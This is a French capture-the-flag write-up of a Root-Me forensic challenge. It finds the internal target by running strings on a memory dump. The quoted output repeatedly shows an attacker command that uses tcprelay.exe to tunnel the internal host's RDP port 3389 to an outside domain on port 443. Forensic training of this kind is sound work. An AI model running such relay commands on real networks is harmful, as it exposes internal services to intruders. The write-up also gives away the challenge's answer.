# Challenge Rootme 4

Lien : https://www.root-me.org/fr/Challenges/Forensic/Command-Control-niveau-4

### Objectif :

**Trouver l'adresse IP du serveur interne que ces cybercriminels visent**

    strings ch2.dmp |grep tcprelay

Output :

      tcprelay.exe
    tcprelay.exe
    tcprelay.exe
    tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
    tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
    tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
    tcprelay.c
    C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
    \Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exe
    \Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exe
    tcprelay.exe
    5C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
    tcprelay.c
    tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
    C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
    C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
    C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
    tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
    01/12/2013  05:57 PM            22,078 tcprelay.exe
    mp\TEMP23\tcprelay.exe
    Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ
    C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
    C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
    C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
    tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
    01/12/2013  05:57 PM            22,078 tcprelay.exe
    C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay
    tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
    C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay
    C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
    C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
    C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
    C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
    C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
    5C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
    tcprelay.c
    tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 

Nous voyons ici que l'adresse IP ainsi que le port est **192.168.0.22:3389** !